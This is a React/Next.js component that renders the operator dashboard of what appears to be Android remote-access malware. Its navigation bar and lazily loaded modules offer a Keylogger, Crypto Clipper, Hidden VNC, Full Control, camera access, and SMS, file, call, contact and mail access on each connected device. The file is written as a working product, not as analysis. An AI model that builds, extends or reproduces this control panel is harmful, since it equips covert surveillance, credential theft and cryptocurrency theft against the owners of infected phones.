"use client";

import { AndroidDevice } from "@/types";
import dynamic from "next/dynamic";
import DeviceOverview from "@/components/dashboard/DeviceOverview";
import { Button } from "@/components/ui/button";
import { MessageSquare, FolderOpen, Phone, Terminal, Mail, Package, Keyboard, EyeOff, Wallet } from "lucide-react";
import { useState } from "react";

// Lazy load heavy feature components
const SMSManager = dynamic(() => import("@/components/features/SMSManager"), {
  loading: () => <div className="p-6">Loading SMS Manager...</div>,
});
const FileManager = dynamic(() => import("@/components/features/FileManager"), {
  loading: () => <div className="p-6">Loading File Manager...</div>,
});
const CallsContacts = dynamic(() => import("@/components/features/CallsContacts"), {
  loading: () => <div className="p-6">Loading Calls & Contacts...</div>,
});
const AccountManager = dynamic(() => import("@/components/features/AccountManager"), {
  loading: () => <div className="p-6">Loading Mails...</div>,
});
const AppsManager = dynamic(() => import("@/components/features/AppsManager"), {
  loading: () => <div className="p-6">Loading Apps...</div>,
});
const CameraView = dynamic(() => import("@/components/features/CameraView"), {
  loading: () => <div className="p-6">Loading Camera...</div>,
});
const FullControl = dynamic(() => import("@/components/features/FullControl"), {
  loading: () => <div className="p-6">Loading Full Control...</div>,
});
const Keylogger = dynamic(() => import("@/components/features/Keylogger"), {
  loading: () => <div className="p-6">Loading Keylogger...</div>,
});
const HiddenVNC = dynamic(() => import("@/components/features/HiddenVNC"), {
  loading: () => <div className="p-6">Loading Hidden VNC...</div>,
});
const CryptoClipper = dynamic(() => import("@/components/features/CryptoClipper"), {
  loading: () => <div className="p-6">Loading Crypto Clipper...</div>,
});

interface MainContentProps {
  device: AndroidDevice | null;
  view: string | null;
  onViewSelect: (view: string) => void;
  userId?: string | null;
}

const navigationItems = [
  { id: "sms", label: "SMS Manager", icon: MessageSquare },
  { id: "files", label: "File Manager", icon: FolderOpen },
  { id: "calls", label: "Calls/Contacts", icon: Phone },
  { id: "accounts", label: "Mails", icon: Mail },
  { id: "apps", label: "Apps", icon: Package },
  { id: "keylogger", label: "Keylogger", icon: Keyboard },
  { id: "crypto", label: "Crypto Clipper", icon: Wallet },
  { id: "control", label: "Full Control", icon: Terminal },
  { id: "hidden-vnc", label: "Hidden VNC", icon: EyeOff },
];

export default function MainContent({ device, view, onViewSelect, userId }: MainContentProps) {
  const [triggerFullControl, setTriggerFullControl] = useState(0);
  const [triggerHiddenVNC, setTriggerHiddenVNC] = useState(0);
  
  if (!device) {
    return null; // DashboardOverview will be shown instead
  }

  const handleViewSelect = (selectedView: string) => {
    // For Full Control and Hidden VNC, don't change view, just trigger popup
    if (selectedView === "control") {
      setTriggerFullControl(prev => prev + 1);
      return; // Don't change the view
    }
    if (selectedView === "hidden-vnc") {
      setTriggerHiddenVNC(prev => prev + 1);
      return; // Don't change the view
    }
    // For other views, change normally
    onViewSelect(selectedView);
  };

  // Wrapper for FullControl and HiddenVNC that handles null values
  const handleViewSelectWithNull = (selectedView: string | null) => {
    if (selectedView === null) {
      // Ignore null values - parent doesn't accept them
      return;
    }
    onViewSelect(selectedView);
  };

  const renderView = () => {
    // If no view selected, show DeviceOverview
    if (!view) {
      return <DeviceOverview device={device} onViewSelect={onViewSelect} userId={userId} />;
    }

    switch (view) {
      case "sms":
        return <SMSManager device={device} />;
      case "files":
        return <FileManager device={device} />;
      case "calls":
        return <CallsContacts device={device} />;
      case "accounts":
        return <AccountManager device={device} />;
      case "apps":
        return <AppsManager device={device} />;
      case "keylogger":
        return <Keylogger device={device} />;
      case "crypto":
        return <CryptoClipper device={device} />;
      case "camera":
        return <CameraView device={device} />;
      case "control":
        // FullControl content is shown via the always-rendered component above
        return null;
      case "hidden-vnc":
        // HiddenVNC content is shown via the always-rendered component above
        return null;
      default:
        return <DeviceOverview device={device} onViewSelect={onViewSelect} userId={userId} />;
    }
  };

  return (
    <>
      {/* Always render FullControl and HiddenVNC ONCE to keep popups persistent and independent */}
      {/* These instances maintain state independently - popups work regardless of view */}
      {/* Content shows when that view is selected */}
      <div className="flex-1 flex flex-col overflow-hidden bg-background/50">
        {/* Always render both components ONCE - they maintain independent state */}
        {/* Popups work regardless of view, content shows when view matches */}
        <FullControl device={device} showContent={false} triggerOpen={triggerFullControl} onViewSelect={handleViewSelectWithNull} />
        <HiddenVNC device={device} showContent={false} triggerOpen={triggerHiddenVNC} onViewSelect={handleViewSelectWithNull} />
      
        {/* Static Navigation Bar - Always visible when device is selected */}
        <div className="flex-shrink-0 border-b bg-card/50 backdrop-blur-sm relative" style={{ zIndex: 45 }}>
          <div className="flex items-center gap-1 p-1">
            {navigationItems.map((item) => {
              const IconComponent = item.icon;
              // Don't show Full Control or Hidden VNC as active since they don't change view
              const isActive = (item.id === "control" || item.id === "hidden-vnc") ? false : view === item.id;
              return (
                <Button
                  key={item.id}
                  variant={isActive ? "default" : "ghost"}
                  size="sm"
                  onClick={() => handleViewSelect(item.id)}
                  className={`h-9 gap-2 flex-1 text-sm font-medium ${
                    isActive ? "" : "hover:bg-accent"
                  }`}
                >
                  <IconComponent className="h-4 w-4" />
                  {item.label}
                </Button>
              );
            })}
          </div>
        </div>

        {/* Feature Content */}
        <div className="flex-1 overflow-y-auto scrollbar-thin">
          {renderView()}
        </div>
      </div>
    </>
  );
}

